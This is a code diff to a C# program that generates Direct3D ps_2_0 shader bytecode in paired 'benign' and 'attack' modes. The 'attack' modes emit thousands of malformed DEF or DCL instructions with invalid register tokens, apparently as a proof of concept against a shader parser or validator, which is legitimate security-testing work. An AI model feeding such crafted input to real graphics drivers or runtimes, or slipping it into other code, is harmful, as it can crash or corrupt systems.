@@ -20,11 +20,21 @@ class Program
     static uint[] Build(int groups, uint dst)
     {
         var t = new List<uint> { 0x00000200 };           // ps_2_0
+        bool dcl = dst == 2 || dst == 3;                  // 2=dcl-benign 3=dcl-attack
         for (int g = 0; g < groups; g++)
         {
-            t.Add(81);                                   // D3DSIO_DEF
-            t.Add(dst);                                  // destination register type
-            t.Add(0); t.Add(0); t.Add(0); t.Add(0);       // four value tokens
+            if (dcl)
+            {
+                t.Add(0x0200001Fu);                       // DCL, INSTLENGTH=2
+                t.Add(0);                                 // usage descriptor
+                t.Add(dst == 2 ? 0x90000000u : 0x10000000u); // INPUT register, bit31 set/cleared
+            }
+            else
+            {
+                t.Add(81);                                // D3DSIO_DEF
+                t.Add(dst);                               // destination register type
+                t.Add(0); t.Add(0); t.Add(0); t.Add(0);   // four value tokens
+            }
         }
         t.Add(0x0000FFFF);                               // D3DSIO_END
         return t.ToArray();
@@ -35,7 +45,14 @@ class Program
     {
         int groups = int.Parse(Environment.GetEnvironmentVariable("GROUPS") ?? "6000");
         string mode = Environment.GetEnvironmentVariable("MODE") ?? "benign";
-        uint dst = mode == "benign" ? (2u << 28) : (0u << 28);  // CONST vs TEMP
+        uint dst = mode switch
+        {
+            "benign" => 2u << 28,   // DEF with CONST destination (well-formed)
+            "attack" => 0u << 28,   // DEF with TEMP destination
+            "dclbenign" => 2u,      // DCL with register token bit31 set (well-formed)
+            "dclattack" => 3u,      // DCL with register token bit31 cleared
+            _ => 2u << 28,
+        };
         var toks = Build(groups, dst);
         byte[] bytes = new byte[toks.Length * 4];
         Buffer.BlockCopy(toks, 0, bytes, 0, bytes.Length);
